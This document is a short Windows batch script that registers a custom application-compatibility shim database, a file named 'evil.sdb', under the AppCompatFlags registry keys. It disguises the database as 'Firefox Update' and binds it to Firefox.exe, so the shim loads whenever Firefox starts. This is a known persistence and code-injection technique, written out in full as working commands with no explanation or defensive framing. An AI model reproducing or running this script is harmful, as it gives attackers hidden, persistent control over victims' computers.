@echo off
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSdb\{12345678-9ABC-DEF0-1234-56789ABCDEF0}" /v DatabaseDescription /t REG_SZ /d "Firefox Update" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSdb\{12345678-9ABC-DEF0-1234-56789ABCDEF0}" /v DatabasePath /t REG_SZ /d "C:\Program Files\evil.sdb" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSdb\{12345678-9ABC-DEF0-1234-56789ABCDEF0}" /v DatabaseRuntimePlatform /t REG_DWORD /d 4 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSdb\{12345678-9ABC-DEF0-1234-56789ABCDEF0}" /v DatabaseType /t REG_SZ /d 65536 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" /v Firefox.exe /t REG_SZ /d "{12345678-9ABC-DEF0-1234-56789ABCDEF0}" /f
